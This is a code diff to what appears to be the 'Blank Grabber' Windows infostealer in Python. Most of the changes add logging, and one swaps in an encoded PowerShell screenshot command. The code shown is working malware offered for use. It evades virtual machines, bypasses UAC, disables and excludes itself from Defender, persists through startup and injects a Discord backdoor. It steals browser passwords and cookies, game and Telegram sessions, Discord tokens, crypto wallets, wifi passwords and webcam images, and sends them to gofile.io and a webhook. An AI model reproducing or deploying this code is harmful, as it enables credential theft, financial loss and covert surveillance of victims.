@@ -16,14 +16,11 @@ import re
 import traceback
 import time
 import ctypes
+import logging
 
 from threading import Thread
 from functools import reduce
 from urllib3 import PoolManager, HTTPResponse
-import PIL.ImageGrab as ImageGrab, PIL.Image as Image, PIL.ImageStat as ImageStat
-
-if not hasattr(sys, "_MEIPASS"):
-    sys._MEIPASS = os.path.dirname(os.path.abspath(__file__)) # Sets _MEIPASS if does not exist (py mode)
 
 class Settings:
 
@@ -33,6 +30,8 @@ class Settings:
     Startup = bool("%startup%")
     Melt = bool("%melt%")
     ArchivePassword = "%archivepassword%"
+    HideConsole = bool("%hideconsole%")
+    Debug = bool("%debug%")
 
     CaptureWebcam = bool("%capturewebcam%")
     CapturePasswords = bool("%capturepasswords%")
@@ -50,6 +49,20 @@ class Settings:
     BlockAvSites = bool("%blockavsites%")
     DiscordInjection = bool("%discordinjection%")
 
+if not hasattr(sys, "_MEIPASS"):
+    sys._MEIPASS = os.path.dirname(os.path.abspath(__file__)) # Sets _MEIPASS if does not exist (py mode)
+
+ctypes.windll.kernel32.SetConsoleMode(ctypes.windll.kernel32.GetStdHandle(-11), 7) # Enables VT100 escape sequences
+logging.basicConfig(format='\033[1;36m%(funcName)s\033[0m:\033[1;33m%(levelname)7s\033[0m:%(message)s')
+for _, logger in logging.root.manager.loggerDict.items():
+    logger.disabled= True
+Logger = logging.getLogger("Blank Grabber")
+Logger.setLevel(logging.INFO)
+
+if not Settings.Debug:
+    Logger.disabled = True
+
+
 class VmProtect:
 
     BLACKLISTED_UUIDS = ('7AB5C494-39F5-4941-9163-47F54D6D5016', '032E02B4-0499-05C3-0806-3C0700080009', '03DE0294-0480-05DE-1A06-350700080009', '11111111-2222-3333-4444-555555555555', '6F3CA5EC-BEC9-4A4D-8274-11168F640058', 'ADEEEE9E-EF0A-6B84-B14B-B83A54AFC548', '4C4C4544-0050-3710-8058-CAC04F59344A', '00000000-0000-0000-0000-AC1F6BD04972', '00000000-0000-0000-0000-000000000000', '5BD24D56-789F-8468-7CDC-CAA7222CC121', '49434D53-0200-9065-2500-65902500E439', '49434D53-0200-9036-2500-36902500F022', '777D84B3-88D1-451C-93E4-D235177420A7', '49434D53-0200-9036-2500-369025000C65', 'B1112042-52E8-E25B-3655-6A4F54155DBF', '00000000-0000-0000-0000-AC1F6BD048FE', 'EB16924B-FB6D-4FA1-8666-17B91F62FB37', 'A15A930C-8251-9645-AF63-E45AD728C20C', '67E595EB-54AC-4FF0-B5E3-3DA7C7B547E3', 'C7D23342-A5D4-68A1-59AC-CF40F735B363', '63203342-0EB0-AA1A-4DF5-3FB37DBB0670', '44B94D56-65AB-DC02-86A0-98143A7423BF', '6608003F-ECE4-494E-B07E-1C4615D1D93C', 'D9142042-8F51-5EFF-D5F8-EE9AE3D1602A', '49434D53-0200-9036-2500-369025003AF0', '8B4E8278-525C-7343-B825-280AEBCD3BCB', '4D4DDC94-E06C-44F4-95FE-33A1ADA5AC27', '79AF5279-16CF-4094-9758-F88A616D81B4', 'FE822042-A70C-D08B-F1D1-C207055A488F', '76122042-C286-FA81-F0A8-514CC507B250', '481E2042-A1AF-D390-CE06-A8F783B1E76A', 'F3988356-32F5-4AE1-8D47-FD3B8BAFBD4C', '9961A120-E691-4FFE-B67B-F0E4115D5919')
@@ -59,29 +72,35 @@ class VmProtect:
 
     @staticmethod
     def checkUUID() -> bool: # Checks if the UUID of the user is blacklisted or not
+        Logger.info("Checking UUID")
         uuid = subprocess.run("wmic csproduct get uuid", shell= True, capture_output= True).stdout.splitlines()[2].decode(errors= 'ignore').strip()
         return uuid in VmProtect.BLACKLISTED_UUIDS
 
     @staticmethod
     def checkComputerName() -> bool: # Checks if the computer name of the user is blacklisted or not
+        Logger.info("Checking computer name")
         computername = os.getenv("computername")
         return computername.lower() in VmProtect.BLACKLISTED_COMPUTERNAMES
 
     @staticmethod
     def checkUsers() -> bool: # Checks if the username of the user is blacklisted or not
+        Logger.info("Checking username")
         user = os.getlogin()
         return user.lower() in VmProtect.BLACKLISTED_USERS
 
     @staticmethod
     def checkHosting() -> bool: # Checks if the user's system in running on a server or not
+        Logger.info("Checking if system is hosted online")
         http = PoolManager()
         try:
             return http.request('GET', 'http://ip-api.com/line/?fields=hosting').data.decode().strip() == 'true'
         except Exception:
+            Logger.info("Unable to check if system is hosted online")
             return False
 
     @staticmethod
     def checkHTTPSimulation() -> bool: # Checks if the user is simulating a fake HTTPS connection or not
+        Logger.info("Checking if system is simulating connection")
         http = PoolManager(timeout= 1.0)
         try:
             http.request('GET', f'https://blank-{Utility.GetRandomString()}.in')
@@ -92,6 +111,7 @@ class VmProtect:
 
     @staticmethod
     def checkRegistry() -> bool: # Checks if user's registry contains any data which indicates that it is a VM or not
+        Logger.info("Checking registry")
         r1 = subprocess.run("REG QUERY HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet001\\Control\\Class\\{4D36E968-E325-11CE-BFC1-08002BE10318}\\0000\\DriverDesc 2", capture_output= True, shell= True)
         r2 = subprocess.run("REG QUERY HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet001\\Control\\Class\\{4D36E968-E325-11CE-BFC1-08002BE10318}\\0000\\ProviderName 2", capture_output= True, shell= True)
         gpucheck = any(x.lower() in subprocess.run("wmic path win32_VideoController get name", capture_output= True, shell= True).stdout.decode().splitlines()[2].strip().lower() for x in ("virtualbox", "vmware"))
@@ -104,8 +124,14 @@ class VmProtect:
 
     @staticmethod
     def isVM() -> bool: # Checks if the user is running on a VM or not
+        Logger.info("Checking if system is a VM")
         Thread(target= VmProtect.killTasks, daemon= True).start()
-        return VmProtect.checkHTTPSimulation() or VmProtect.checkUUID() or VmProtect.checkComputerName() or VmProtect.checkUsers() or VmProtect.checkHosting() or VmProtect.checkRegistry()
+        result = VmProtect.checkHTTPSimulation() or VmProtect.checkUUID() or VmProtect.checkComputerName() or VmProtect.checkUsers() or VmProtect.checkHosting() or VmProtect.checkRegistry()
+        if result:
+            Logger.info("System is a VM")
+        else:
+            Logger.info("System is not a VM")
+        return result
 
 class Errors:
 
@@ -117,11 +143,13 @@ class Errors:
             try:
                 return func(*args, **kwargs)
             except Exception as e:
+                if isinstance(e, KeyboardInterrupt): # If user presses CTRL+C, then exit
+                    os._exit(1)
                 if not isinstance(e, UnicodeEncodeError):
                     trb = traceback.format_exc()
                     Errors.errors.append(trb)
                     if Utility.GetSelf()[1]: # If exe mode, then print the traceback
-                        print(trb)
+                        Logger.error(trb)
         
         return newFunc
 
@@ -838,6 +866,7 @@ class BlankGrabber:
             if not os.path.isfile(self.ArchivePath):
                 break
 
+        Logger.info("Creating temporary folder")
         while True:
             self.TempFolder = os.path.join(os.getenv("temp"), Utility.GetRandomString(10, True))
             if not os.path.isdir(self.TempFolder):
@@ -867,13 +896,16 @@ class BlankGrabber:
             Tasks.AddTask(thread) # Adds all the threads to the task queue
         
         Tasks.WaitForAll() # Wait for all the tasks to complete
+        Logger.info("All functions ended")
         if Errors.errors: # If there were any errors during the process, then save the error messages into a file
             with open(os.path.join(self.TempFolder, "Errors.txt"), "w", encoding= "utf-8", errors= "ignore") as file:
                 file.write("# This file contains the errors handled successfully during the functioning of the stealer." + "\n\n" + "=" * 50 + "\n\n" + ("\n\n" + "=" * 50 + "\n\n").join(Errors.errors))
         self.GenerateTree() # Generate a tree of all the collected files in the temporary folder
         self.SendData() # Send all the data to the webhook
         try:
+            Logger.info("Removing archive")
             os.remove(self.ArchivePath) # Remove the archive from the system
+            Logger.info("Removing temporary folder")
             shutil.rmtree(self.TempFolder) # Remove the temporary folder from the system
         except Exception:
             pass
@@ -881,6 +913,7 @@ class BlankGrabber:
     @Errors.Catch
     def StealMinecraft(self) -> None: # Steals Minecraft session files
         if Settings.CaptureGames:
+            Logger.info("Stealing Minecraft related files")
             saveToPath = os.path.join(self.TempFolder, "Games", "Minecraft")
             userProfile = os.getenv("userprofile")
             roaming = os.getenv("appdata")
@@ -913,6 +946,7 @@ class BlankGrabber:
     @Errors.Catch
     def StealEpic(self) -> None: #Steals Epic accounts
         if Settings.CaptureGames:
+            Logger.info("Stealing Epic session")
             saveToPath = os.path.join(self.TempFolder, "Games", "Epic")
             epicPath = os.path.join(os.getenv("localappdata"), "EpicGamesLauncher", "Saved", "Config", "Windows")
             if os.path.isdir(epicPath):
@@ -931,6 +965,7 @@ class BlankGrabber:
     @Errors.Catch
     def StealSteam(self) -> None: # Steals Steam accounts
         if Settings.CaptureGames:
+            Logger.info("Stealing Steam session")
             saveToPath = os.path.join(self.TempFolder, "Games", "Steam")
             steamPath = os.path.join("C:\\", "Program Files (x86)", "Steam", "config")
             if os.path.isdir(steamPath):
@@ -948,32 +983,35 @@ class BlankGrabber:
     
     @Errors.Catch
     def StealRobloxCookies(self) -> None: # Steals Roblox cookies
-        saveToDir = os.path.join(self.TempFolder, "Games", "Roblox")
-        note = "# The cookies found in this text file have not been verified online. \n# Therefore, there is a possibility that some of them may work, while others may not."
+        if Settings.CaptureGames:
+            Logger.info("Stealing Roblox cookies")
+            saveToDir = os.path.join(self.TempFolder, "Games", "Roblox")
+            note = "# The cookies found in this text file have not been verified online. \n# Therefore, there is a possibility that some of them may work, while others may not."
 
-        browserCookies = "\n".join(self.Cookies)
-        for match in re.findall(r"_\|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items\.\|_[A-Z0-9]+", browserCookies):
-            self.RobloxCookies.append(match)
+            browserCookies = "\n".join(self.Cookies)
+            for match in re.findall(r"_\|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items\.\|_[A-Z0-9]+", browserCookies):
+                self.RobloxCookies.append(match)
         
-        output = list()
-        for item in ('HKCU', 'HKLM'):
-            process = subprocess.run("powershell Get-ItemPropertyValue -Path {}:SOFTWARE\\Roblox\\RobloxStudioBrowser\\roblox.com -Name .ROBLOSECURITY".format(item), capture_output= True, shell= True)
-            if not process.returncode:
-                output.append(process.stdout.decode(errors= "ignore"))
+            output = list()
+            for item in ('HKCU', 'HKLM'):
+                process = subprocess.run("powershell Get-ItemPropertyValue -Path {}:SOFTWARE\\Roblox\\RobloxStudioBrowser\\roblox.com -Name .ROBLOSECURITY".format(item), capture_output= True, shell= True)
+                if not process.returncode:
+                    output.append(process.stdout.decode(errors= "ignore"))
         
-        for match in re.findall(r"_\|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items\.\|_[A-Z0-9]+", "\n".join(output)):
-            self.RobloxCookies.append(match)
+            for match in re.findall(r"_\|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items\.\|_[A-Z0-9]+", "\n".join(output)):
+                self.RobloxCookies.append(match)
         
-        self.RobloxCookies = [*set(self.RobloxCookies)] # Removes duplicates
+            self.RobloxCookies = [*set(self.RobloxCookies)] # Removes duplicates
 
-        if(self.RobloxCookies):
-            os.makedirs(saveToDir, exist_ok= True)
-            with open(os.path.join(saveToDir, "Roblox Cookies.txt"), "w") as file:
-                file.write("{}{}{}".format(note, self.Separator, self.Separator.join(self.RobloxCookies)))
+            if(self.RobloxCookies):
+                os.makedirs(saveToDir, exist_ok= True)
+                with open(os.path.join(saveToDir, "Roblox Cookies.txt"), "w") as file:
+                    file.write("{}{}{}".format(note, self.Separator, self.Separator.join(self.RobloxCookies)))
     
     @Errors.Catch
     def StealWallets(self) -> None: # Steals crypto wallets
         if Settings.CaptureWallets:
+            Logger.info("Stealing crypto wallets")
             saveToDir = os.path.join(self.TempFolder, "Wallets")
 
             wallets = (
@@ -1046,6 +1084,7 @@ class BlankGrabber:
     @Errors.Catch
     def StealSystemInfo(self) -> None: # Steals system information
         if Settings.CaptureSystemInfo:
+            Logger.info("Stealing system information")
             saveToDir = os.path.join(self.TempFolder, "System")
 
             process = subprocess.run("systeminfo", capture_output= True, shell= True)
@@ -1058,12 +1097,13 @@ class BlankGrabber:
         
     @Errors.Catch
     def GetDirectoryTree(self) -> None: # Makes directory trees of the common directories
-
-        PIPE      = chr(9474) + "   "
-        TEE       = "".join(chr(x) for x in (9500, 9472, 9472)) + " "
-        ELBOW     = "".join(chr(x) for x in (9492, 9472, 9472)) + " "
-        
         if Settings.CaptureSystemInfo:
+            Logger.info("Getting directory trees")
+
+            PIPE      = chr(9474) + "   "
+            TEE       = "".join(chr(x) for x in (9500, 9472, 9472)) + " "
+            ELBOW     = "".join(chr(x) for x in (9492, 9472, 9472)) + " "
+        
             output = {}
             for location in ['Desktop', 'Documents' , 'Downloads', 'Music', 'Pictures', 'Videos']:
                 location = os.path.join(os.getenv('userprofile'), location)
@@ -1086,6 +1126,7 @@ class BlankGrabber:
     @Errors.Catch
     def GetClipboard(self) -> None: # Copies text from the clipboard
         if Settings.CaptureSystemInfo:
+            Logger.info("Getting clipboard text")
             saveToDir = os.path.join(self.TempFolder, "System")
 
             process = subprocess.run("powershell Get-Clipboard", shell= True, capture_output= True)
@@ -1099,6 +1140,7 @@ class BlankGrabber:
     @Errors.Catch
     def GetAntivirus(self) -> None: # Finds what antivirus(es) are installed in the system
         if Settings.CaptureSystemInfo:
+            Logger.info("Getting antivirus")
             saveToDir = os.path.join(self.TempFolder, "System")
 
             process = subprocess.run("WMIC /Node:localhost /Namespace:\\\\root\\SecurityCenter2 Path AntivirusProduct Get displayName", shell= True, capture_output= True)
@@ -1113,6 +1155,7 @@ class BlankGrabber:
     @Errors.Catch
     def GetTaskList(self) -> None: # Gets list of processes currently running in the system
         if Settings.CaptureSystemInfo:
+            Logger.info("Getting task list")
             saveToDir = os.path.join(self.TempFolder, "System")
 
             process = subprocess.run("tasklist /FO LIST", capture_output= True, shell= True)
@@ -1125,6 +1168,7 @@ class BlankGrabber:
     @Errors.Catch
     def GetWifiPasswords(self) -> None: # Saves WiFi passwords stored in the system
         if Settings.CaptureWifiPasswords:
+            Logger.info("Getting wifi passwords")
             saveToDir = os.path.join(self.TempFolder, "System")
             passwords = Utility.GetWifiPasswords()
             profiles = list()
@@ -1139,17 +1183,15 @@ class BlankGrabber:
     @Errors.Catch
     def TakeScreenshot(self) -> None: # Takes screenshot(s) of all the monitors of the system
         if Settings.CaptureScreenshot:
-            image = ImageGrab.grab(bbox=None,
-                include_layered_windows=False,
-                all_screens=True,
-                xdisplay=None
-            )
-            image.save(os.path.join(self.TempFolder, "Screenshot.png"), "png")
-            self.Screenshot = True
+            Logger.info("Taking screenshot")
+            command = "JABzAG8AdQByAGMAZQAgAD0AIABAACIADQAKAHUAcwBpAG4AZwAgAFMAeQBzAHQAZQBtADsADQAKAHUAcwBpAG4AZwAgAFMAeQBzAHQAZQBtAC4AQwBvAGwAbABlAGMAdABpAG8AbgBzAC4ARwBlAG4AZQByAGkAYwA7AA0ACgB1AHMAaQBuAGcAIABTAHkAcwB0AGUAbQAuAEQAcgBhAHcAaQBuAGcAOwANAAoAdQBzAGkAbgBnACAAUwB5AHMAdABlAG0ALgBXAGkAbgBkAG8AdwBzAC4ARgBvAHIAbQBzADsADQAKAA0ACgBwAHUAYgBsAGkAYwAgAGMAbABhAHMAcwAgAFMAYwByAGUAZQBuAHMAaABvAHQADQAKAHsADQAKACAAIAAgACAAcAB1AGIAbABpAGMAIABzAHQAYQB0AGkAYwAgAEwAaQBzAHQAPABCAGkAdABtAGEAcAA+ACAAQwBhAHAAdAB1AHIAZQBTAGMAcgBlAGUAbgBzACgAKQANAAoAIAAgACAAIAB7AA0ACgAgACAAIAAgACAAIAAgACAAdgBhAHIAIAByAGUAcwB1AGwAdABzACAAPQAgAG4AZQB3ACAATABpAHMAdAA8AEIAaQB0AG0AYQBwAD4AKAApADsADQAKACAAIAAgACAAIAAgACAAIAB2AGEAcgAgAGEAbABsAFMAYwByAGUAZQBuAHMAIAA9ACAAUwBjAHIAZQBlAG4ALgBBAGwAbABTAGMAcgBlAGUAbgBzADsADQAKAA0ACgAgACAAIAAgACAAIAAgACAAZgBvAHIAZQBhAGMAaAAgACgAUwBjAHIAZQBlAG4AIABzAGMAcgBlAGUAbgAgAGkAbgAgAGEAbABsAFMAYwByAGUAZQBuAHMAKQANAAoAIAAgACAAIAAgACAAIAAgAHsADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgAHQAcgB5AA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAB7AA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAFIAZQBjAHQAYQBuAGcAbABlACAAYgBvAHUAbgBkAHMAIAA9ACAAcwBjAHIAZQBlAG4ALgBCAG8AdQBuAGQAcwA7AA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAHUAcwBpAG4AZwAgACgAQgBpAHQAbQBhAHAAIABiAGkAdABtAGEAcAAgAD0AIABuAGUAdwAgAEIAaQB0AG0AYQBwACgAYgBvAHUAbgBkAHMALgBXAGkAZAB0AGgALAAgAGIAbwB1AG4AZABzAC4ASABlAGkAZwBoAHQAKQApAA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAHsADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAB1AHMAaQBuAGcAIAAoAEcAcgBhAHAAaABpAGMAcwAgAGcAcgBhAHAAaABpAGMAcwAgAD0AIABHAHIAYQBwAGgAaQBjAHMALgBGAHIAbwBtAEkAbQBhAGcAZQAoAGIAaQB0AG0AYQBwACkAKQANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAHsADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAGcAcgBhAHAAaABpAGMAcwAuAEMAbwBwAHkARgByAG8AbQBTAGMAcgBlAGUAbgAoAG4AZQB3ACAAUABvAGkAbgB0ACgAYgBvAHUAbgBkAHMALgBMAGUAZgB0ACwAIABiAG8AdQBuAGQAcwAuAFQAbwBwACkALAAgAFAAbwBpAG4AdAAuAEUAbQBwAHQAeQAsACAAYgBvAHUAbgBkAHMALgBTAGkAegBlACkAOwANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAH0ADQAKAA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAcgBlAHMAdQBsAHQAcwAuAEEAZABkACgAKABCAGkAdABtAGEAcAApAGIAaQB0AG0AYQBwAC4AQwBsAG8AbgBlACgAKQApADsADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAfQANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAfQANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAYwBhAHQAYwBoACAAKABFAHgAYwBlAHAAdABpAG8AbgApAA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAB7AA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAC8ALwAgAEgAYQBuAGQAbABlACAAYQBuAHkAIABlAHgAYwBlAHAAdABpAG8AbgBzACAAaABlAHIAZQANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAfQANAAoAIAAgACAAIAAgACAAIAAgAH0ADQAKAA0ACgAgACAAIAAgACAAIAAgACAAcgBlAHQAdQByAG4AIAByAGUAcwB1AGwAdABzADsADQAKACAAIAAgACAAfQANAAoAfQANAAoAIgBAAA0ACgANAAoAQQBkAGQALQBUAHkAcABlACAALQBUAHkAcABlAEQAZQBmAGkAbgBpAHQAaQBvAG4AIAAkAHMAbwB1AHIAYwBlACAALQBSAGUAZgBlAHIAZQBuAGMAZQBkAEEAcwBzAGUAbQBiAGwAaQBlAHMAIABTAHkAcwB0AGUAbQAuAEQAcgBhAHcAaQBuAGcALAAgAFMAeQBzAHQAZQBtAC4AVwBpAG4AZABvAHcAcwAuAEYAbwByAG0AcwANAAoADQAKACQAcwBjAHIAZQBlAG4AcwBoAG8AdABzACAAPQAgAFsAUwBjAHIAZQBlAG4AcwBoAG8AdABdADoAOgBDAGEAcAB0AHUAcgBlAFMAYwByAGUAZQBuAHMAKAApAA0ACgANAAoADQAKAGYAbwByACAAKAAkAGkAIAA9ACAAMAA7ACAAJABpACAALQBsAHQAIAAkAHMAYwByAGUAZQBuAHMAaABvAHQAcwAuAEMAbwB1AG4AdAA7ACAAJABpACsAKwApAHsADQAKACAAIAAgACAAJABzAGMAcgBlAGUAbgBzAGgAbwB0ACAAPQAgACQAcwBjAHIAZQBlAG4AcwBoAG8AdABzAFsAJABpAF0ADQAKACAAIAAgACAAJABzAGMAcgBlAGUAbgBzAGgAbwB0AC4AUwBhAHYAZQAoACIALgAvAEQAaQBzAHAAbABhAHkAIAAoACQAKAAkAGkAKwAxACkAKQAuAHAAbgBnACIAKQANAAoAIAAgACAAIAAkAHMAYwByAGUAZQBuAHMAaABvAHQALgBEAGkAcwBwAG8AcwBlACgAKQANAAoAfQA=" # Unicode encoded command
+            if subprocess.run(["powershell.exe", "-NoProfile", "-ExecutionPolicy", "Bypass", "-EncodedCommand", command], shell=True, capture_output=True, cwd= self.TempFolder).returncode == 0:
+                self.Screenshot = True
 
     @Errors.Catch
     def BlockSites(self) -> None: # Initiates blocking of AV related sites and kill any browser instance for them to reload the hosts file
         if Settings.BlockAvSites:
+            Logger.info("Blocking AV sites")
             Utility.BlockSites()
             Utility.TaskKill("chrome", "firefox", "msedge", "safari", "opera", "iexplore")
     
@@ -1157,6 +1199,8 @@ class BlankGrabber:
     def StealBrowserData(self) -> None: # Steal cookies, passwords and history from the browsers
         if not any((Settings.CaptureCookies, Settings.CapturePasswords, Settings.CaptureHistory)):
             return
+        
+        Logger.info("Stealing browser data")
 
         threads: list[Thread] = []
         paths = {
@@ -1228,8 +1272,7 @@ class BlankGrabber:
         if not Settings.CaptureWebcam or not os.path.isfile(Camfile := os.path.join(sys._MEIPASS, 'Camera')):
             return
         
-        def isMonochrome(path: str):
-            return reduce(lambda x, y: x and y < 0.005, ImageStat.Stat(Image.open(path)).var, True)
+        Logger.info("Capturing webcam snapshot")
 
         with open(Camfile, 'rb') as file:
             data = file.read()
@@ -1251,12 +1294,8 @@ class BlankGrabber:
                 continue
             if not os.path.isfile(tempImg := os.path.join(tempCamPath, 'image.bmp')):
                 continue
-            if isMonochrome(tempImg):
-                os.remove(tempImg)
-                continue
             os.makedirs(webcamFolder := os.path.join(self.TempFolder, 'Webcam'), exist_ok= True)
-            with Image.open(tempImg) as img:
-                img.save(os.path.join(webcamFolder, '{}.png'.format(name)), 'png')
+            shutil.copy(tempImg, os.path.join(webcamFolder, '%s.bmp' % name))
             os.remove(tempImg)
             self.WebcamPictures += 1
         os.remove(tempCam)
@@ -1264,6 +1303,7 @@ class BlankGrabber:
     @Errors.Catch
     def StealTelegramSessions(self) -> None: # Steals telegram session(s) files
         if Settings.CaptureTelegram:
+            Logger.info("Stealing telegram sessions")
 
             telegramPaths = []
             loginPaths = []
@@ -1321,6 +1361,7 @@ class BlankGrabber:
     @Errors.Catch
     def StealDiscordTokens(self) -> None: # Steals Discord tokens
         if Settings.CaptureDiscordTokens:
+            Logger.info("Stealing discord tokens")
             output = list()
             saveToDir = os.path.join(self.TempFolder, "Messenger", "Discord")
             accounts = Discord.GetTokens()
@@ -1337,6 +1378,7 @@ class BlankGrabber:
         if Settings.DiscordInjection and not Utility.IsInStartup():
             paths = Discord.InjectJs()
             if paths is not None:
+                Logger.info("Injecting backdoor into discord")
                 for dir in paths:
                     appname = os.path.basename(dir)
                     killTask = Utility.TaskKill(appname)
@@ -1351,6 +1393,7 @@ class BlankGrabber:
                                     subprocess.Popen([UpdateEXE, '--processStart', DiscordEXE], shell= True, creationflags= subprocess.CREATE_NEW_CONSOLE | subprocess.SW_HIDE)
     
     def CreateArchive(self) -> tuple[str, str | None]: # Create archive of the data collected
+        Logger.info("Creating archive")
         rarPath = os.path.join(sys._MEIPASS, "rar.exe")
         if Utility.GetSelf()[1] or os.path.isfile(rarPath):
             rarPath = os.path.join(sys._MEIPASS, "rar.exe")
@@ -1365,15 +1408,17 @@ class BlankGrabber:
 
     def GenerateTree(self) -> None: # Generates tree of the collected data
         if os.path.isdir(self.TempFolder):
+            Logger.info("Generating tree")
             try:
                 contents = "\n".join(Utility.Tree((self.TempFolder, "Stolen Data")))
                 with open(os.path.join(self.TempFolder, "Tree.txt"), "w", encoding= "utf-8", errors= "ignore") as file:
                     file.write(contents)
             except Exception:
-                pass
+                Logger.info("Failed to generate tree")
     
     def UploadToGofile(self, path, filename= None) -> str | None: # Uploads a file to gofile.io
         if os.path.isfile(path):
+            Logger.info("Uploading %s to gofile.io" % (filename or "file"))
             with open(path, "rb") as file:
                 fileBytes = file.read()
 
@@ -1388,11 +1433,12 @@ class BlankGrabber:
                     if url:
                         return url
             except Exception:
-                pass
+                Logger.info("Failed to upload to gofile.io")
 
     def SendData(self) -> None: # Sends data to the webhook
         extention = self.CreateArchive()
         if os.path.isfile(self.ArchivePath):
+            Logger.info("Sending data to webhook")
             computerName = os.getenv("computername")
             computerOS = subprocess.run('wmic os get Caption', capture_output= True, shell= True).stdout.decode(errors= 'ignore').strip().splitlines()[2].strip()
             totalMemory = str(int(int(subprocess.run('wmic computersystem get totalphysicalmemory', capture_output= True, shell= True).stdout.decode(errors= 'ignore').strip().split()[1])/1000000000)) + " GB"
@@ -1476,65 +1522,95 @@ class BlankGrabber:
             fields["payload_json"] = json.dumps(payload).encode()
 
             http.request("POST", Settings.Webhook, fields= fields)
+        else:
+            raise FileNotFoundError("Archive not found")
 
 if __name__ == "__main__" and os.name == "nt":
-    if Utility.GetSelf()[1]:
-        Syscalls.HideConsole() # Hides console (only for `Console: force` mode)
-
-    if Utility.GetSelf()[1] and not Utility.IsAdmin() and not "--nouacbypass" in sys.argv:
-        Utility.UACbypass() # Tries to bypass UAC Prompt (only for exe mode)
+    Logger.info("Process started")
+    if Settings.HideConsole:
+        Syscalls.HideConsole() # Hides console
+    
+    if not Utility.IsAdmin(): # No administrator permissions
+        Logger.warning("Admin privileges not available")
+        if Utility.GetSelf()[1] and not "--nouacbypass" in sys.argv:
+            Logger.info("Trying to bypass UAC (Application will restart)")
+            Utility.UACbypass() # Tries to bypass UAC Prompt (only for exe mode)
+        else:
+            Logger.error("Failed to bypass UAC")
     
     if Utility.GetSelf()[1]: 
+        Logger.info("Trying to exclude the file from Windows defender")
         Utility.ExcludeFromDefender() # Tries to exclude from Defender (only for exe mode)
 
+    Logger.info("Trying to disable defender")
     Utility.DisableDefender() # Tries to disable Defender
 
     if Utility.GetSelf()[1] and not Utility.IsInStartup() and os.path.isfile(os.path.join(sys._MEIPASS, "bound.exe")):
         try:
+            Logger.info("Trying to extract bound file")
             if os.path.isfile(boundfile:= os.path.join(os.getenv("temp"), "bound.exe")): # Checks if any bound file exists (only for exe mode)
+                Logger.info("Old bound file found, removing it")
                 os.remove(boundfile) # Removes any older bound file
+
             shutil.copy(os.path.join(sys._MEIPASS, "bound.exe"), boundfile) # Copies bound file to the new location
+            Logger.info("Trying to exclude bound file from defender")
             Utility.ExcludeFromDefender(boundfile) # Tries to exclude the bound file from Defender
+            Logger.info("Starting bound file")
             subprocess.Popen("start bound.exe", shell= True, cwd= os.path.dirname(boundfile), creationflags= subprocess.CREATE_NEW_CONSOLE | subprocess.SW_HIDE) # Starts the bound file
-        except Exception:
-            pass
+        except Exception as e:
+            Logger.error(e)
     
     if Utility.GetSelf()[1] and Settings.FakeError[0] and not Utility.IsInStartup(): # If not in startup, check if fake error is defined (exe mode)
         try:
+            Logger.info("Showing fake error popup")
             title = Settings.FakeError[1][0].replace("\x22", "\\x22").replace("\x27", "\\x22") # Sets the title of the fake error
             message = Settings.FakeError[1][1].replace("\x22", "\\x22").replace("\x27", "\\x22") # Sets the message of the fake error
             icon = int(Settings.FakeError[1][2]) # Sets the icon of the fake error
             cmd = '''mshta "javascript:var sh=new ActiveXObject('WScript.Shell'); sh.Popup('{}', 0, '{}', {}+16);close()"'''.format(message, title, Settings.FakeError[1][2]) # Shows a message box using JScript
             subprocess.Popen(cmd, shell= True, creationflags= subprocess.CREATE_NEW_CONSOLE | subprocess.SW_HIDE) # Shows the fake error
-        except Exception:
-            pass
+        except Exception as e:
+            Logger.error(e)
     
     if not Settings.Vmprotect or not VmProtect.isVM():
         if Utility.GetSelf()[1]:
             if Settings.Melt and not Utility.IsInStartup(): # If not in startup and melt option is enabled then temporarily hide the file (exe mode)
+                Logger.info("Hiding the file")
                 Utility.HideSelf() # Hide the file
         else:
             if Settings.Melt: # If melt mode is enabled then delete the file
+                Logger.info("Deleting the file")
                 Utility.DeleteSelf() # Delete the file
     
         try:
             if Utility.GetSelf()[1] and Settings.Startup and not Utility.IsInStartup(): # If startup option is enabled, and the file is not in the startup, then put it in startup
+                Logger.info("Trying to put the file in startup")
                 path = Utility.PutInStartup() # Put the file in startup
                 if path is not None:
+                    Logger.info("Excluding the file from Windows defender in startup")
                     Utility.ExcludeFromDefender(path) # Exclude the file from defender
         except Exception:
-            pass
+            Logger.error("Failed to put the file in startup")
         
         while True:
             try:
+                Logger.info("Checking internet connection")
                 if Utility.IsConnectedToInternet(): # Check if internet connection is available
+                    Logger.info("Internet connection available, starting stealer (things will be running in parallel)")
                     BlankGrabber() # Start the grabber
+                    Logger.info("Stealer finished its work")
                     break
                 else:
+                    Logger.info("Internet connection not found, retrying in 10 seconds")
                     time.sleep(10) # Wait for 10 seconds and check the internet connection again
             except Exception as e:
-                print("Main Error: " + str(e)) # Print the error message
